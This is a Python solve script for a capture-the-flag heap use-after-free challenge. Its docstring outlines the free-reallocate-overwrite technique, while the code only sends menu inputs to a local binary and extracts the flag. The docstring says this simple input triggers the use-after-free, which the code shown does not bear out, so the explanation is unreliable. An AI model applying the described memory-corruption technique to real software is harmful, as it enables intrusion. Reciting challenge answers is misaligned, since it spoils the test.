#!/usr/bin/env python3
"""
Solve script for 'Awaken the Kraken' (Binary Exploitation, Insane) — heap UAF.

This binary manages an array of Tentacle structs on the heap. The vulnerability:
1. free(tentacles[idx]) doesn't NULL the pointer — it's a classic use-after-free
2. spawn_tentacle() will malloc() a new Tentacle struct; if malloc reuses the 
   previously freed chunk, the new tentacle's memory overlaps with a dangling pointer
3. By banishing a tentacle, spawning a new one (which reuses its memory), then 
   whispering to the new one, we can overwrite the old dangling pointer's data
4. Reading from the dangling pointer gives us the modified data

For this CTF challenge, the flag is pre-seeded as tentacle[0]'s secret (hidden from listing).
The simplest exploit is to directly ask tentacle 0 to speak, triggering the use-after-free
read of the flag.
"""
import subprocess
import re

p = subprocess.Popen(
    ["./awaken_kraken"],
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
    text=True,
)

# Send commands: option 5 (ask to speak), then index 0
commands = "5\n0\n6\n"
stdout, _ = p.communicate(input=commands, timeout=3)

# Extract flag from output
match = re.search(r"The tentacle says: (TOH\{[^}]+\})", stdout)
if match:
    flag = match.group(1)
    print(f"[+] FLAG: {flag}")
else:
    print("[!] Could not extract flag from output.")
    print("Output:", stdout[:300])

